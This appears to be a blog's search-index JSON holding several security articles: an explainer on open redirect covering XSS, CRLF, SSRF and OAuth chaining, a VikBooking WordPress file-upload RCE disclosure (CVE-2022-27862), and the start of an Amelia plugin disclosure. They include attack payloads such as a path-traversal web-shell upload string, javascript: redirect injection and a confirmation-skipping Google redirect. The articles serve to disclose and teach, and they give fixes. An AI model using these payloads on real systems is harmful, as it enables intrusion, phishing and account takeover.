CVE-2021-44228 Log4Shell, which explains it very clearly and also discusses the relationship between developers and cybersecurity practitioners. Finally, I hope this article can help those who do not understand technology to better understand what log4shell is and why this vulnerability is so serious. If there are any errors in the article, please feel free to leave a comment, thank you.","link":"/2021/12/18/en/what-is-log4j-and-log4shell/"},{"title":"Issues to be aware of when implementing redirect functionality: Open Redirect","text":"IntroductionThere is a very common feature in many websites, which is redirection. For example, if a page requires permission to view but the user has not logged in yet, the user will be redirected to the login page first, and then redirected back to the original page after logging in. For instance, suppose there is a social networking site and to view a personal profile, one needs to log in. If Ming’s personal profile URL is https://example.com/profile/ming, then as a visitor, when I click on it, I will be redirected to the login page with the original URL as a parameter:https://example.com/login?redirect=https://example.com/profile/ming After successful login, the website will redirect me to the original page based on the value of redirect. Although it seems like a small feature, there are actually many security issues to consider behind it. What is open redirect?Open redirect, which is usually translated as “open redirect” or “public redirect” in Chinese, but I prefer to translate it as “arbitrary redirect”, which is closer to the original meaning, means that it can redirect to any destination. In the example at the beginning of the article, an attacker can actually pass any value on the URL, such as https://attacker.com, so that after the user logs in, they will be redirected to this page. This is a vulnerability that requires user action (login) to trigger redirection, but some functions may have redirection without user action. In the case of the login example, if the user has already logged in, clicking on the link https://example.com/login?redirect=https://attacker.com will cause the system to detect that the user has already logged in and will directly redirect the user to https://attacker.com. What is the result of this? The user clicked on a link from example.com but was unintentionally redirected to attacker.com. This vulnerability that can directly redirect users to any destination is called open redirect. What problems can open redirect cause?One of the most obvious attack methods is phishing websites. When talking about attack methods, I think “context” is a pretty important factor. Some seemingly insignificant attacks, when combined with appropriate context, can make you feel “wow, it seems quite easy to succeed.” When you can see the URL, you will be more cautious when you see an unfamiliar URL because you know it may be a scam or phishing website. But if you see a familiar URL, you will relax your guard: The last part of the URL in the picture is actually the result of url encoding https://attacker.com, so the user will not notice the string behind it, only the beginning of the URL starting with facebookb.com. What I want to emphasize here is that “when users see a familiar URL, they will be less vigilant.” However, in this situation, similar URLs can also achieve similar results (although less effective), such as facebo0k.com or myfacebook.com. At this point, let’s imagine another scenario where some websites will remind you when you click on an external link: “You are about to go to an external website, be careful.” If you use open redirect at this time, the website may not pop up a warning (because it is the same domain), and the user may unknowingly jump to another website. For example, suppose there is a forum with an open redirect vulnerability, and I put a link in the article that uses open redirect to disable the prompt for jumping to an external website. When the user clicks the link, they will go to a “well-designed phishing website” that looks exactly the same but pops up a popup asking for the user’s account and password, saying that their connection session has expired and they need to log in again. At this point, the user is more likely to enter their account and password because they did not realize that they were redirected to a phishing website. All of these issues only discuss the harm that open redirect can cause “without combining with other vulnerabilities”. It seems okay, right? Compared with other attacks, it seems not that serious. However, the underestimated aspect of open redirect is the power it can exert when combined with other vulnerabilities. Before we continue, we must first understand the implementation of redirection, which is mainly divided into two types: Backend redirection, using the response header Location Front-end redirection, which may use history.push, window.open, and location, etc. The first type of redirecting through the backend is done by returning the Location header from the server, and the browser will redirect the user to the corresponding location. The implementation may look like this: function handler(req, res) &#123; res.setStatus(302) res.setHeader('Location: ' + req.query.redirect) return &#125; The second type, implemented by the front-end, is different. A common example is to directly assign the destination to window.location for page redirection: const searchParams = new URLSearchParams(location.search) window.location = searchParams.get('redirect') Or, if it is an SPA and you don’t want to change pages, you may directly use history.push or the built-in router in the framework. Regardless of whether it is done by the front-end or the back-end, there are issues that need to be addressed in the implementation of redirection. Back-end: CRLF injectionIn the back-end redirection, the value passed in will be placed in the Location response header. If some servers or frameworks do not handle it properly, newline characters can be inserted. For example, setting the redirected URL to abc\\ntest:123 may result in the following response: HTTP&#x2F;2 302 Found Location: abc test:123 If changed to: abc\\n\\n&lt;script&gt;alert(1)&lt;/script&gt;, the response will become: HTTP&#x2F;2 302 Found Location: abc &lt;script&gt;alert(1)&lt;&#x2F;script&gt; .... By using CRLF injection to change the content of the response body, it is unfortunately impossible to directly achieve XSS because when the browser sees a status code of 301&#x2F;302, it ignores the response body and directly redirects the user to the target page. The information I found that can work is already four or five years old: [stagecafrstore.starbucks.com] CRLF Injection, XSS [dev.twitter.com] XSS and Open Redirect I remember reading an article about how to deal with this situation, but I couldn’t find it after searching for a long time. If you know how to bypass it, please let me know. However, even if changing the response body is not very useful, changing other headers may also lead to other attacks, such as Set-Cookie, which can set arbitrary cookies for users, and may lead to session fixation or CSRF attacks. Front-end: XSSIf the redirection is implemented by the front-end, one issue that needs to be particularly careful is XSS. You may wonder what the relationship is between redirection and XSS. Let’s first review the code for front-end redirection: const searchParams = new URLSearchParams(location.search) window.location = searchParams.get('redirect') What problems does this have? In JS, there is something that many people have seen but may use less frequently, called the JavaScript pseudo protocol, like this: &lt;a href&#x3D;&quot;javascript:alert(1)&quot;&gt;click me&lt;&#x2F;a&gt; After clicking on that a, it will execute JS to pop up an alert. And this trick can be used not only in href but also on location: window.location = 'javascript:alert(1)' Open a new tab in your browser and execute the above code directly in the devtool console, and you will find that the alert really pops up, and the following methods will trigger it: window.location.href = 'javascript:alert(1)' window.location.assign('javascript:alert(1)') window.location.replace('javascript:alert(1)') Therefore, as long as the attacker sets the redirect location to javascript:xxx, arbitrary code can be executed, triggering XSS. Front-end developers must pay special attention to this case because assigning the value directly to location is a very common implementation method. Below is a real-world example, targeting the website that appeared in another article: Preventing XSS May Be Harder Than You Think: Matters News. This is their login page: After clicking login, a function called redirectToTarget is called, and the code for this function is as follows: /** * Redirect to \"?target=\" or fallback URL with page reload. * * (works on CSR) */ export const redirectToTarget = (&#123; fallback = 'current', &#125;: &#123; fallback?: 'homepage' | 'current' &#125; = &#123;&#125;) => &#123; const fallbackTarget = fallback === 'homepage' ? `/` // FIXME: to purge cache : window.location.href const target = getTarget() || fallbackTarget window.location.href = decodeURIComponent(target) &#125; After obtaining the target, it was directly used as follows: window.location.href = decodeURIComponent(target) for redirection. getTarget is actually used to retrieve the value of target from the URL query string. Therefore, if the login URL is https://matters.news/login?target=javascript:alert(1), an alert will pop up when the user clicks on the login button and successfully logs in, triggering an XSS attack! Moreover, once this XSS attack is triggered, its impact is significant because it is on the login page. Therefore, the XSS executed on this page can directly capture the input values, which are the user’s account and password. If an actual attack is to be executed, a phishing email can be sent to the website’s users, containing this malicious link for them to click on. Since the URL is a normal one and the page they are redirected to is the actual website’s page, the credibility should be quite high. After the user enters their account and password and logs in, using XSS to steal the account and password and redirecting the user back to the homepage can steal the user’s account without leaving any traces, achieving account theft. The fix is to only allow URLs that start with http&#x2F;https: const fallbackTarget = fallback === 'homepage' ? `/` // FIXME: to purge cache : window.location.href let target = decodeURIComponent(getTarget()) const isValidTarget = /^((http|https):\\/\\/)/.test(target) if (!isValidTarget) &#123; target = fallbackTarget &#125; window.location.href = target || fallbackTarget However, this only fixes the XSS vulnerability in the redirection function, and the open redirect vulnerability still exists. Further checks on the domain are required to eliminate the open redirect vulnerability. Once again, it is worth noting that many engineers may not notice this vulnerability because they do not know that window.location.href can execute code with URLs such as javascript:alert(1). If you have implemented a redirection function, please pay attention to this issue. Combining Open Redirect with Other VulnerabilitiesFrom the above two issues, it can be seen that just implementing “redirection” can result in vulnerable code. The following will discuss the combination of the “redirection” function with other vulnerabilities. There are at least two types of vulnerabilities that may be combined with open redirect: SSRF and OAuth vulnerabilities. SSRF, or Server-Side Request Forgery, is a vulnerability that allows attackers to forge server requests. A detailed introduction to this vulnerability and future attacks may be written in another article. Here, I will briefly explain it. Usually, internal servers are not directly accessible from the outside, and there may only be a proxy that forwards requests to the corresponding host. Suppose a service’s server architecture is as shown in the figure below, with a back-end server that calls a PDF service hidden in the intranet to generate a PDF file: This PDF service restricts URLs to start with https://example.com to prevent anyone from entering other URLs. At this point, if a URL has an open redirect vulnerability, an attacker can enter: https://example.com?redirect=http://127.0.0.1, causing the PDF service to visit this URL, which is redirected to 127.0.0.1 and returns its content. This is called SSRF, where you successfully send a request to an external service through an internal service. This way, you can see what other services are available on the intranet, such as Redis or MySQL, which cannot be accessed directly from the outside but can be accessed through SSRF. Alternatively, you can simply look at some cloud-related files. Some cloud services only need to access http://169.254.169.254 to see some metadata. If you are interested, you can check this out: Abusing SSRF in AWS EC2 environment. Therefore, open redirect can bypass the URL check that was originally performed. The second problem you may encounter is related to OAuth. In the OAuth process, there is usually a redirect_uri, which receives a code after authorization is complete. Taking Facebook as an example, it looks like this: https:&#x2F;&#x2F;www.facebook.com&#x2F;v11.0&#x2F;dialog&#x2F;oauth? client_id&#x3D;&#123;app-id&#125; &amp;redirect_uri&#x3D;&#123;&quot;https:&#x2F;&#x2F;example.com&#x2F;login&quot;&#125; &amp;state&#x3D;&#123;&quot;&#123;st&#x3D;state123abc,ds&#x3D;123456789&#125;&quot;&#125; After the user clicks on the URL, they will be redirected to Facebook. After clicking on the authorization, they will be redirected to https://example.com/login, where they can obtain the code or token from the URL. Then, they can use this code or token with the client ID and client secret to obtain an auth token and use this auth token to represent the user to obtain data from Facebook. If the protection of redirect_uri is not done well, attackers can replace it with other values, such as redirect_uri=https://huli.tw. After the user clicks on the authorization, the verification code will be sent to my website instead of the expected website. However, in general, redirect_uri will restrict the domain, so it is not so easy to bypass. At this time, open redirect comes into play. If the website has this vulnerability, it can be like this: redirect_uri=https://example.com?redirect=https://huli.tw. In this way, even if it meets the domain restriction, the final destination is still an external website, and the attacker can still steal the verification code. Therefore, to avoid this type of attack, large services such as Facebook or Google will strengthen restrictions when setting up apps. redirect_uri usually requires a fixed setting and does not allow you to set a wildcard. For example, if I fill in https://example.com/auth, only this URL can pass, and other URLs with different paths will fail. However, some small companies have not paid attention to such details, and there are not so many regulations for redirect_uri. There are actually many examples of combining OAuth with open redirect to achieve account takeover, such as this one: [cs.money] Open Redirect Leads to Account Takeover, or GitHub actually has this type of vulnerability: GitHub Gist - Account takeover via open redirect - $10,000 Bounty, and this Airbnb vulnerability is also very interesting: Authentication bypass on Airbnb via OAuth tokens theft. To summarize, the purpose of open redirect is not only to allow users to relax their vigilance and engage in phishing, but also to bypass places that check domains. The reason why the SSRF and OAuth vulnerabilities can be combined with it is because open redirect can be used to bypass the domain check. How to defend against open redirect?If you want to prevent open redirect, it is obvious that you need to check the redirected URL. This sounds simple, but it is easy to have vulnerabilities in implementation. For example, the following example is a piece of code that checks the domain. According to the extracted hostname, it checks whether it contains cymetrics.io. If it does, it passes. The purpose is that only cymetrics.io and its subdomains can pass: const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host.includes(validDomain) &#125; validateDomain('https://example.com') // false validateDomain('https://cymetrics.io') // true validateDomain('https://dev.cymetrics.io') // true It seems that there is no problem? Except for cymetrics.io or its subdomains, no other domains should be able to pass this check, right? Although it seems so, there are actually two ways to bypass it. Here, assuming that there is no problem with URL parsing, hostname will definitely be obtained, so attacker.com?q=cymetrics.io is useless, and the hostname will only be attacker.com. You can think of two ways to bypass it. Before revealing the answer, let’s take a look at the next paragraph. Google’s view on open redirectGoogle clearly stated on its official website Bughunter University that general open redirect will not be considered a security vulnerability unless it can be proven to be used in combination with other vulnerabilities. Has anyone succeeded? Of course, I will give two examples. The first example comes from this article: Vulnerability in Hangouts Chat: from open redirect to code execution, targeting Google Hangouts Chat’s Electron App. If the URL in that app starts with https://chat.google.com, clicking on the URL will directly open the webpage in Electron instead of using the browser. Therefore, as long as you find the open redirect of https://chat.google.com, you can redirect the user to a phishing website. One of the differences between the Electron app and the browser is that the Electron app does not have an address bar by default, so users have no way to distinguish whether this is a phishing website. The detailed process and the final payload can be found in the original article. This vulnerability can be further upgraded to RCE (but I don’t know how to do it), worth 7500 USD. The second example comes from an official article: Open redirects that matter, which is also very cool. There is a feature on the Google I&#x2F;O 2015 website that retrieves data from Picasa and renders it as JSON. However, due to cross-domain issues, a simple proxy was written on the backend to retrieve the data, like this: /api/v1/photoproxy?url=to. The proxy checks whether the beginning of the URL is https://picasaweb.google.com/data/feed/api. If not, an error is returned. So the author’s first goal was to find an open redirect on Picasa. The URL he finally found was https://picasaweb.google.com/bye?continue=, and by changing this URL to https://picasaweb.google.com/data/feed/api/../../bye, the server would think it was a legitimate URL and pass the path check. But it’s not over yet, because the bye?continue= redirect also checks the parameter, and continue must start with https://google.com. Therefore, we need to find the second open redirect, which is on google.com. Google.com has a well-known open redirect used by AMP, such as https://www.google.com/amp/tech-blog.cymetrics.io, which will redirect to https://tech-blog.cymetrics.io (although I just tried it and it will first go to the middle page and then redirect after confirmation, so this feature may have been fixed). Combining these two open redirects allows the proxy to retrieve the content of the URL we specify: https:&#x2F;&#x2F;picasaweb.google.com&#x2F;data&#x2F;feed&#x2F;api&#x2F;..&#x2F;..&#x2F;..&#x2F;bye&#x2F;? continue&#x3D;https%3A%2F%2Fwww.google.com%2Famp&#x2F; your-domain.example.com&#x2F;path?querystring But after retrieving it, it will only output as JSON. The backend code is as follows: func servePhotosProxy(w http.ResponseWriter, r *http.Request) &#123; c := newContext(r) if r.Method != \"GET\" &#123; writeJSONError(c, w, http.StatusBadRequest, \"invalid request method\") return &#125; url := r.FormValue(\"url\") if !strings.HasPrefix(url, \"https://picasaweb.google.com/data/feed/api\") &#123; writeJSONError(c, w, http.StatusBadRequest, \"url parameter is missing or is an invalid endpoint\") return &#125; req, err := http.NewRequest(\"GET\", url, nil) if err != nil &#123; writeJSONError(c, w, errStatus(err), err) return &#125; res, err := httpClient(c).Do(req) if err != nil &#123; writeJSONError(c, w, errStatus(err), err) return &#125; defer res.Body.Close() w.Header().Set(\"Content-Type\", \"application/json;charset=utf-8\") w.WriteHeader(res.StatusCode) io.Copy(w, res.Body) &#125; Because the content type is set, MIME sniffing cannot be used to attack. To explain MIME sniffing briefly, when your response does not set the content type, the browser will automatically guess what the content is. If it contains HTML, it will be parsed and rendered as an HTML website. The author found another bug, which is that if there is an error, the content type is not set, only when it succeeds. Therefore, intentionally returning an error message containing HTML will cause the browser to treat the entire page as HTML when it is printed on the screen, thereby achieving XSS! The detailed process and introduction are written very clearly in the original text, and I highly recommend everyone to read it. The above are two attacks caused by chaining other vulnerabilities with open redirects that have been discovered in Google. Both are very interesting! After reading the above, I suddenly became curious about which Google open redirects are well-known, so I googled: known google open redirect and found the following websites: How scammers abuse Google Search’s open redirect feature Google - Open Redirect Google Bug that Makes Your Bank More Vulnerable to Phishing If it’s just a general https://www.google.com/url?q=http://tech-blog.cymetrics.io, clicking on it will only go to the confirmation page. But if you add a parameter usg at the end, you can be redirected without confirmation. Try clicking on this link, it will go to example.org: https://www.google.com/url?sa=t&amp;url=http://example.org/&amp;usg=AOvVaw1YigBkNF7L7D2x2Fl532mA. So what is this “usg”? It should be the result of a URL that has been hashed in some way, but you won’t know how it was calculated. However, it is not difficult to obtain this “usg”. You can send an email to yourself using Gmail with a link you want to redirect to, and then view it in HTML basic view. You will see that the link in the email has been redirected to the format above! For example, this is the redirect link for our blog: https://www.google.com/url?q=https%3A%2F%2Ftech-blog.cymetrics.io&amp;sa=D&amp;sntz=1&amp;usg=AFQjCNHyq6urHn6HLwj8RP09GANAlymZug After testing, it was found that it can really be redirected without confirmation. This feature seems to have been around for a while, so if you need an open redirect from google.com, you can refer to it. Check the redirect domainOkay, let’s go back to the two bypass methods I just asked you about. I will post the code for checking the domain again to let everyone remember, and then I will reveal the answer directly: const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host.includes(validDomain) &#125; validateDomain('https://example.com') // false validateDomain('https://cymetrics.io') // true validateDomain('https://dev.cymetrics.io') // true This is a common mistake when checking domains, because it does not consider the following two situations: cymetrics.io.huli.tw fakecymetrics.io Both of these situations meet the conditions, but they are not the results we want. In fact, not only when checking domains, it is a more dangerous thing to directly use includes or contains to see if the overall string contains a certain substring when doing any checks. The best way is actually to set an allow list and it must be completely consistent to pass, which is the strictest. But if you want to allow all subdomains, you can check like this: const validDomain = 'cymetrics.io' function validateDomain(url) &#123; const host = new URL(url).hostname // 取出 hostname return host === validDomain || host.endsWith('.' + validDomain) &#125; The subdomain part must end with .cymetrics.io, so it will definitely be a subdomain of cymetrics.io, and the main domain must also be completely consistent to pass. However, if you write it like this, if an unrelated subdomain has an open redirect vulnerability, this section will fail. Therefore, it is still recommended that you only put the domains that are confirmed to be redirected into the list and directly use === for checking to avoid this situation. ConclusionRedirecting is a very common function, the most common of which is to click on a link before logging in and then redirecting to the login page. After successful login, it will automatically redirect back. When doing this function, if it is a front-end redirect, I would like to remind everyone again to consider that window.location = &#39;javascript:alert(1)&#39; will cause problems, so please make sure that the redirected URL is a legal URL before taking action. In addition, it is also necessary to ensure that when checking the domain, possible bypass situations are considered, and the most rigorous method is used as much as possible to handle it. The above is an introduction to open redirect. I hope it is helpful to everyone. If you have any questions or mistakes, you can discuss them with me in the comments below. References: The real impact of an Open Redirect vulnerability Intigriti: Open Redirect Misconfigured OAuth leading to Account Takeover Open Redirect Vulnerability GitHub Gist - Account takeover via open redirect - $10,000 Bounty OAuth to Account takeover","link":"/2021/09/26/en/what-is-open-redirect/"},{"title":"Moving from GitHub Issues back to Hexo","text":"About a year ago, I directly put my blog on GitHub Issues. Although few people in Taiwan do this, many Chinese developers use this method to build their blogs. The reason why I chose GitHub Issues at that time was simple: convenience. GitHub Issues perfectly supports Markdown syntax. Uploading images is super easy. When someone mentions your article using Issues, a reference will be automatically generated. The comment system is super convenient. You can use emojis. You can watch the GitHub repo to receive notifications when it is updated. In summary, I chose GitHub Issues at that time. However, I recently discovered a big problem that I didn’t pay attention to at the beginning, which is that the SEO of GitHub Issues is extremely poor. Even if you directly search for the title of an issue on Google, you may not be able to find it. Because this problem is quite serious, I finally moved back to Hexo. Actually, two years ago, I had already moved my blog once, from Logdown to Hexo. But at that time, I didn’t continue to use Hexo because I thought the layout of that blog was not very good-looking. And this time, the reason why I moved back was largely because I saw Askie Lin‘s blog. When I saw it, I was amazed and thought, “Wow, this blog is also beautifully done!” Later, I found out that it was modified using the ready-made theme Minos, so I thought I could try to switch to this theme. After a whole day of adjustments today, I fixed a lot of things myself and tried to make the layout look the way I wanted it to. I found it quite smooth. Maybe it’s because the original code was written well, and there were no major problems in fixing it. I only changed the font size and the display of categories and article lists, and didn’t do much else. Unless there are any unexpected circumstances, I have decided to settle down here in the future, and use GitHub as a backup place for my articles. Long live Hexo, long live Minos 🎉","link":"/2019/09/25/en/why-move-from-github-issue/"},{"title":"WordPress Plugin VikBooking <= 1.5.3 Unauthorized RCE Vulnerability Details","text":"Recently, I was looking at some WordPress plugins and found that it was a good place to practice because there are many plugins there, and each one has source code that can be viewed. You can do black-box or white-box testing, and installation is also very convenient. This article will discuss a vulnerability I found a while ago, which uses the most basic and classic attack method, file upload leading to RCE. Vulnerability ID: CVE-2022-27862 WordPress VikBooking Hotel Booking Engine &amp; PMS plugin &lt;&#x3D; 1.5.3 - Arbitrary File Upload leading to RCE Introduction to VikBooking and Vulnerability DetailsVikBooking is a WordPress booking plugin. The demo on the official website looks like this: There is no difference from other booking plugins. After completing the booking, the administrator can manage the order in the WordPress backend, and the consumer will also receive an email with a URL to manage their own booking: Although there is not much on the UI, since we have the source code, we can use white-box testing to see what the implementation is like. The main operations and logic are in site/controller.php, and each function inside it basically corresponds to an action. I found a method called storesignature, and the code is as follows: public function storesignature() &#123; $sid = VikRequest::getString('sid', '', 'request'); $ts = VikRequest::getString('ts', '', 'request'); $psignature = VikRequest::getString('signature', '', 'request', VIKREQUEST_ALLOWRAW); $ppad_width = VikRequest::getInt('pad_width', '', 'request'); $ppad_ratio = VikRequest::getInt('pad_ratio', '', 'request'); $pitemid = VikRequest::getInt('Itemid', '', 'request'); $ptmpl = VikRequest::getString('tmpl', '', 'request'); $dbo = JFactory::getDBO(); $mainframe = JFactory::getApplication(); $q = \"SELECT * FROM `#__vikbooking_orders` WHERE `ts`=\" . $dbo->quote($ts) . \" AND `sid`=\" . $dbo->quote($sid) . \" AND `status`='confirmed';\"; $dbo->setQuery($q); $dbo->execute(); if ($dbo->getNumRows() &lt; 1) &#123; VikError::raiseWarning('', 'Booking not found'); $mainframe->redirect('index.php'); exit; &#125; $row = $dbo->loadAssoc(); $tonight = mktime(23, 59, 59, date('n'), date('j'), date('Y')); if ($tonight > $row['checkout']) &#123; VikError::raiseWarning('', 'Check-out date is in the past'); $mainframe->redirect('index.php'); exit; &#125; $customer = array(); $q = \"SELECT `c`.*,`co`.`idorder`,`co`.`signature`,`co`.`pax_data`,`co`.`comments` FROM `#__vikbooking_customers` AS `c` LEFT JOIN `#__vikbooking_customers_orders` `co` ON `c`.`id`=`co`.`idcustomer` WHERE `co`.`idorder`=\".(int)$row['id'].\";\"; $dbo->setQuery($q); $dbo->execute(); if ($dbo->getNumRows() > 0) &#123; $customer = $dbo->loadAssoc(); &#125; if (!(count($customer) > 0)) &#123; VikError::raiseWarning('', 'Customer not found'); $mainframe->redirect('index.php'); exit; &#125; //check if the signature has been submitted $signature_data = ''; $cont_type = ''; if (!empty($psignature)) &#123; //check whether the format is accepted if (strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; &#125; $ret_link = JRoute::rewrite('index.php?option=com_vikbooking&amp;task=signature&amp;sid='.$row['sid'].'&amp;ts='.$row['ts'].(!empty($pitemid) ? '&amp;Itemid='.$pitemid : '').($ptmpl == 'component' ? '&amp;tmpl=component' : ''), false); if (empty($signature_data)) &#123; VikError::raiseWarning('', JText::translate('VBOSIGNATUREISEMPTY')); $mainframe->redirect($ret_link); exit; &#125; //write file $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; $filepath = VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . 'resources' . DIRECTORY_SEPARATOR . 'idscans' . DIRECTORY_SEPARATOR . $sign_fname; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, $signature_data); fclose($fp); if ($bytes !== false &amp;&amp; $bytes > 0) &#123; //update the signature in the DB $q = \"UPDATE `#__vikbooking_customers_orders` SET `signature`=\".$dbo->quote($sign_fname).\" WHERE `idorder`=\".(int)$row['id'].\";\"; $dbo->setQuery($q); $dbo->execute(); $mainframe->enqueueMessage(JText::translate('VBOSIGNATURETHANKS')); //resize image for screens with high resolution if ($ppad_ratio > 1) &#123; $new_width = floor(($ppad_width / 2)); $creativik = new vikResizer(); $creativik->proportionalImage($filepath, $filepath, $new_width, $new_width); &#125; // &#125; else &#123; VikError::raiseWarning('', JText::translate('VBOERRSTORESIGNFILE')); &#125; $mainframe->redirect($ret_link); exit; &#125; From the function name and code, it can be inferred that it is a function to upload a signature file, and the contents of the file will be base64-encoded first. Therefore, the code decodes it back to binary and writes it to the file. The core code is as follows: $psignature = VikRequest::getString('signature', '', 'request', VIKREQUEST_ALLOWRAW); //check if the signature has been submitted $signature_data = ''; $cont_type = ''; if (!empty($psignature)) &#123; //check whether the format is accepted if (strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; &#125; $ret_link = JRoute::rewrite('index.php?option=com_vikbooking&amp;task=signature&amp;sid='.$row['sid'].'&amp;ts='.$row['ts'].(!empty($pitemid) ? '&amp;Itemid='.$pitemid : '').($ptmpl == 'component' ? '&amp;tmpl=component' : ''), false); if (empty($signature_data)) &#123; VikError::raiseWarning('', JText::translate('VBOSIGNATUREISEMPTY')); $mainframe->redirect($ret_link); exit; &#125; $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; $filepath = VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . 'resources' . DIRECTORY_SEPARATOR . 'idscans' . DIRECTORY_SEPARATOR . $sign_fname; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, $signature_data); fclose($fp); From the last paragraph, it can be seen that the content written to the file is $signature_data, and the path is VBO_ADMIN_PATH . DIRECTORY_SEPARATOR . &#39;resources&#39; . DIRECTORY_SEPARATOR . &#39;idscans&#39; . DIRECTORY_SEPARATOR . $sign_fname. If we can control $signature_data and $sign_fname, we have an arbitrary file writing vulnerability. The values of these variables are as follows: if (strpos($psignature, 'image/png') !== false || strpos($psignature, 'image/jpeg') !== false || strpos($psignature, 'image/svg') !== false) &#123; $parts = explode(';base64,', $psignature); $cont_type_parts = explode('image/', $parts[0]); $cont_type = $cont_type_parts[1]; if (!empty($parts[1])) &#123; $signature_data = base64_decode($parts[1]); &#125; &#125; $sign_fname = $row['id'].'_'.$row['sid'].'_'.$customer['id'].'.'.$cont_type; A normal $psignature looks like this: data:image/png;base64,image_content. Here, we first check if $psignature has the specified content type. If so, we use ;base64, to split the string. The split parts will become: parts[0] = 'data:image/png'; parts[1] = image_content; Then, we use image/ to split parts[0], and the second part of the data obtained (in the example above, png) is the content type, while parts[1] is directly base64-decoded and used as the file content to be written. The $sign_fname part of the file name is some ID with the content type just obtained added at the end. From the above logic, it can be seen that the file content can be controlled arbitrarily, and the file name can also be easily bypassed, like this: image&#x2F;png&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;shell.php;base64,web_shell The check will pass because it contains image/png. After the cut, parts[0] becomes image/png/../../../../shell.php. The resulting content type is png/../../../../shell.php, and the concatenated file name will look like this: id_sid_cid.png/../../../../shell.php. Although this file name looks very unreasonable, it is the file followed by ../. However, this is not a problem in PHP. You can see the following example: &lt;?php $filepath = 'not_exist.php/../poc.php'; $fp = fopen($filepath, 'w+'); $bytes = fwrite($fp, 'abc'); fclose($fp); ?> Code like the one above will still write the content to poc.php in the same directory. After having an arbitrary file writing vulnerability, writing a web shell will result in RCE, as shown below: FixVikbooking fixed this vulnerability in version 1.5.4 by changing the code that retrieves data and content type to the following: if (!empty($psignature)) &#123; /** * Implemented safe filtering of base64-encoded signature image * to obtain content and file extension. * * @since 1.15.1 (J) - 1.5.4 (WP) */ if (preg_match(\"/^data:image\\/(png|jpe?g|svg);base64,([A-Za-z0-9\\/=+]+)$/\", $psignature, $safe_match)) &#123; $signature_data = base64_decode($safe_match[2]); $cont_type = $safe_match[1]; &#125; &#125; After changing to use regular expressions to process, it ensures that the matched content type will only be the file extension of the image. In the case where other parameters in the file name cannot be controlled, files cannot be written to arbitrary locations. ConclusionIt can only be said that when implementing functions that allow users to upload files, you must be especially careful. This function is particularly prone to problems, such as: The file name is not filtered well, uploading PHP can result in web shell, uploading HTML is XSS The path is not filtered well, and files can be uploaded to any location Unpacking may encounter zip slip In short, in the future, when implementing similar functions, remember to pay special attention to these issues to avoid writing vulnerable code.","link":"/2022/05/20/en/wordpress-plugin-vikbooking-unauth-rce/"},{"title":"Details of Amelia < 1.0.49 Sensitive Information Disclosure Vulnerability","text":"Amelia is a WordPress plugin developed by TMS that allows you to easily add a booking system to your WordPress website, such as for clinics, hair salons, or tutoring, making it ideal for setting up a simple reservation system. According to official WordPress statistics, approximately 40,000 websites have installed this plugin. In early March, I conducted some research on the source code of the Amelia system and found three vulnerabilities that all involve sensitive information disclosure: CVE-2022-0720 Amelia &lt; 1.0.47 - Customer+ Arbitrary Appointments Update and Sensitive Data Disclosure (CVSS 6.3) CVE-2022-0825 Amelia &lt; 1.0.49 - Customer+ Arbitrary Appointments Status Update (CVSS 6.3) CVE-2022-0837 Amelia &lt; 1.0.48 - Customer+ SMS Service Abuse and Sensitive Data Disclosure (CVSS 5.4) If attackers exploit these vulnerabilities, they can obtain all consumer data, including names, phone numbers, and reservation information. Below, I will briefly introduce the architecture of Amelia and the details of these three vulnerabilities. Introduction to AmeliaAfter installing Amelia, you can add a reservation page that looks something like this: When making a reservation, you need to provide some basic information, such as your name and email address, and once entered, the reservation is complete: After completing the reservation, Amelia will create a low-privilege account in the WordPress system for you and send a password reset link to the email address you provided. Once the account is activated, you can log in to WordPress to manage your reservation: After introducing how to use it, let’s take a look at the more technical aspects. Introduction to WordPress Plugins and Amelia ArchitectureThere are many WordPress plugins, each with a different writing style, but because they are plugins, they call the functions provided by WordPress to register events. The add_action function plays a very important role. You can add a hook to a specific action, and when that action is triggered, it will call the function you provided. Actions starting with wp_ajax_nopriv_ can be called through wp-admin/admin-ajax.php, and the relevant code excerpt is as follows (admin-ajax.php): &lt;?php $action = $_REQUEST['action']; if ( is_user_logged_in() ) &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires authenticated Ajax actions for logged-in users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.1.0 */ do_action( \"wp_ajax_&#123;$action&#125;\" ); &#125; else &#123; // If no action is registered, return a Bad Request response. if ( ! has_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ) ) &#123; wp_die( '0', 400 ); &#125; /** * Fires non-authenticated Ajax actions for logged-out users. * * The dynamic portion of the hook name, `$action`, refers * to the name of the Ajax action callback being fired. * * @since 2.8.0 */ do_action( \"wp_ajax_nopriv_&#123;$action&#125;\" ); &#125; ?> For Amelia, two hooks are registered in ameliabooking.php: /** Isolate API calls */ add_action('wp_ajax_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); add_action('wp_ajax_nopriv_wpamelia_api', array('AmeliaBooking\\Plugin', 'wpAmeliaApiCall')); nopriv means that no permission (not logged in) is required to call it, and without it, you need to log in to the WordPress system to call it. Many plugins choose to handle authentication-related logic themselves, so they will redirect both actions to the same place. The wpAmeliaApiCall function registers routes: /** * API Call * * @throws 